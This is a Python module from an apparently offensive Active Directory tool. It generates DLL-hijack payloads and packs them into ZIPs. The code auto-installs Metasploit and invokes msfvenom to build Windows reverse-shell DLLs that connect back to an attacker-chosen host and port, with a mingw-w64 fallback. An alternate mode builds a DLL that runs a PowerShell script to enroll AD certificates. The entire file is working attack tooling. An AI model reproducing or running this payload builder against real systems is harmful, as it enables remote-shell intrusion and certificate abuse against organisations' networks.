from __future__ import annotations

import os
import subprocess
import sys
import zipfile
from dataclasses import dataclass
from pathlib import Path

from typing import Any, Literal

from admapper.core.network import log_detected_callback_ip
from admapper.core.output import print_info, print_success, print_warning
from admapper.core.platform import resolve_executable
from admapper.postex.pe_arch import TargetArch, infer_arch_from_monitor_log, normalize_arch

PayloadMode = Literal["shell", "enroll"]


def bootstrap_metasploit() -> None:
    """Skip Homebrew msfvenom first-run interactive wizard (database/PATH prompts)."""
    msf4 = Path.home() / ".msf4"
    msf4.mkdir(parents=True, exist_ok=True)
    (msf4 / "initial_setup_complete").touch()


def _msfvenom_env() -> dict[str, str]:
    env = os.environ.copy()
    for base in (Path("/opt/metasploit-framework"), Path("/usr/local/opt/metasploit-framework")):
        if not base.is_dir():
            continue
        embedded = base / "embedded" / "bin"
        scripts = base / "bin"
        env["PATH"] = f"{embedded}:{scripts}:{env.get('PATH', '')}"
    for key in list(env):
        if key.startswith("RBENV"):
            env.pop(key, None)
    env.pop("RBENV_VERSION", None)
    return env


def resolve_msfvenom() -> str | None:
    found = resolve_executable(["msfvenom"])
    if found:
        return found
    for candidate in (
        Path("/opt/homebrew/bin/msfvenom"),
        Path("/opt/metasploit-framework/bin/msfvenom"),
        Path("/usr/local/bin/msfvenom"),
    ):
        if candidate.is_file():
            return str(candidate)
    return None


def ensure_msfvenom() -> str:
    found = resolve_msfvenom()
    if found:
        bootstrap_metasploit()
        return found
    if sys.platform != "darwin":
        raise RuntimeError(
            "msfvenom not found — install Metasploit or pass --payload /path/to.dll"
        )
    brew = resolve_executable(["brew"])
    if not brew:
        raise RuntimeError(
            "msfvenom not found and Homebrew missing — install: brew install metasploit"
        )
    print_info("msfvenom not found — installing Metasploit via Homebrew (one-time) …")
    proc = subprocess.run([brew, "install", "metasploit"], capture_output=True, text=True, check=False)
    if proc.returncode != 0:
        detail = (proc.stderr or proc.stdout or "").strip()
        raise RuntimeError(f"brew install metasploit failed: {detail}")
    found = resolve_msfvenom()
    if not found:
        raise RuntimeError("Metasploit installed but msfvenom still not on PATH — open a new shell")
    bootstrap_metasploit()
    return found


def _run_msfvenom(cmd: list[str]) -> subprocess.CompletedProcess[str]:
    """Run msfvenom non-interactively (skip PATH/DB wizard prompts)."""
    bootstrap_metasploit()
    return subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        check=False,
        timeout=180,
        env=_msfvenom_env(),
        input="n\nn\n",
    )


def build_reverse_shell_dll_msfvenom(
    *,
    lhost: str,
    lport: int,
    out_path: Path,
    arch: TargetArch = "x86",
) -> Path:
    msfvenom = ensure_msfvenom()
    out_path.parent.mkdir(parents=True, exist_ok=True)
    payload = "windows/x64/shell_reverse_tcp" if arch == "x64" else "windows/shell_reverse_tcp"
    cmd = [
        msfvenom,
        "-p",
        payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f",
        "dll",
        "-o",
        str(out_path),
    ]
    print_info(f"building {arch} DLL via msfvenom ({lhost}:{lport}) …")
    proc = _run_msfvenom(cmd)
    if proc.returncode != 0 or not out_path.is_file():
        detail = (proc.stderr or proc.stdout or "").strip()
        raise RuntimeError(detail or f"msfvenom exit {proc.returncode}")
    print_success(f"payload DLL → {out_path} ({out_path.stat().st_size} bytes, msfvenom)")
    return out_path


def build_reverse_shell_dll(
    *,
    lhost: str,
    lport: int,
    out_path: Path,
    arch: TargetArch = "x86",
    auto_install_msfvenom: bool = True,
) -> Path:
    """Build reverse-shell DLL — msfvenom first, mingw-w64 fallback."""
    if auto_install_msfvenom and resolve_msfvenom():
        try:
            return build_reverse_shell_dll_msfvenom(
                lhost=lhost, lport=lport, out_path=out_path, arch=arch
            )
        except RuntimeError as exc:
            msg = str(exc).splitlines()[0][:160]
            print_warning(f"msfvenom unavailable ({msg}) — falling back to mingw-w64")
    from admapper.postex.dllgen import build_reverse_shell_dll_mingw

    return build_reverse_shell_dll_mingw(lhost=lhost, lport=lport, out_path=out_path, arch=arch)


def resolve_lhost(lhost: str | None, *, exclude: set[str] | None = None) -> str:
    if lhost:
        print_info(f"callback IP (--lhost): {lhost}")
        return lhost
    return log_detected_callback_ip(exclude=exclude)


@dataclass
class PayloadBuildResult:
    dll_path: Path
    zip_path: Path
    generator: str
    lhost: str = ""
    lport: int = 0


def pack_dll_zip(dll_path: Path, zip_name: str, out_dir: Path) -> Path:
    out_dir.mkdir(parents=True, exist_ok=True)
    zip_path = out_dir / zip_name
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.write(dll_path, arcname=dll_path.name)
    return zip_path


def prepare_hijack_payload(
    *,
    workspace_dir: Path,
    dll_name: str,
    zip_name: str,
    lhost: str | None,
    lport: int,
    payload_dll: Path | None,
    drop_path: str = r"C:\ProgramData",
    exclude_ips: set[str] | None = None,
    auto_install_msfvenom: bool = True,
    arch: TargetArch | None = None,
    payload_mode: PayloadMode = "shell",
    enroll_template: str = "",
    enroll_dns: str = "",
    enroll_ca_name: str = "",
    enroll_ca_host: str = "",
    enroll_run_as_user: str | None = None,
    enroll_profile: Any | None = None,
) -> PayloadBuildResult:
    payloads_dir = workspace_dir / "payloads"
    payloads_dir.mkdir(parents=True, exist_ok=True)
    dll_path = payloads_dir / dll_name

    if payload_dll is not None:
        if not payload_dll.is_file():
            raise FileNotFoundError(f"payload not found: {payload_dll}")
        import shutil

        shutil.copy2(payload_dll, dll_path)
        return PayloadBuildResult(
            dll_path=dll_path,
            zip_path=pack_dll_zip(dll_path, zip_name, payloads_dir),
            generator="user-supplied",
        )

    callback = resolve_lhost(lhost, exclude=exclude_ips) if payload_mode == "shell" else ""
    target_arch: TargetArch = arch or "x86"

    if payload_mode == "enroll":
        from admapper.adcs.enroll import build_local_enroll_powershell
        from admapper.postex.dllgen import build_cert_enroll_dll_mingw

        certs_dir = workspace_dir / "certs"
        certs_dir.mkdir(parents=True, exist_ok=True)
        ps = build_local_enroll_powershell(
            template=enroll_template,
            dns_name=enroll_dns,
            ca_host=enroll_ca_host,
            ca_name=enroll_ca_name,
            profile=enroll_profile,
            run_as_user=enroll_run_as_user,
            drop_path=drop_path,
        )
        import uuid

        script_name = f"enroll-{uuid.uuid4().hex[:8]}.ps1"
        (certs_dir / script_name).write_text(ps + "\n", encoding="utf-8")
        build_cert_enroll_dll_mingw(
            out_path=dll_path,
            arch=target_arch,
            drop_path=drop_path,
            enroll_script=script_name,
        )
        zip_path = pack_dll_zip(dll_path, zip_name, payloads_dir)
        print_success(f"enroll payload ZIP → {zip_path}")
        return PayloadBuildResult(
            dll_path=dll_path,
            zip_path=zip_path,
            generator=f"cert_enroll/{target_arch} ({enroll_template} → {enroll_dns})",
        )

    build_reverse_shell_dll(
        lhost=callback,
        lport=lport,
        out_path=dll_path,
        arch=target_arch,
        auto_install_msfvenom=auto_install_msfvenom,
    )
    zip_path = pack_dll_zip(dll_path, zip_name, payloads_dir)
    print_success(f"payload ZIP → {zip_path}")
    return PayloadBuildResult(
        dll_path=dll_path,
        zip_path=zip_path,
        generator=f"reverse_shell/{target_arch} ({callback}:{lport})",
        lhost=callback,
        lport=lport,
    )
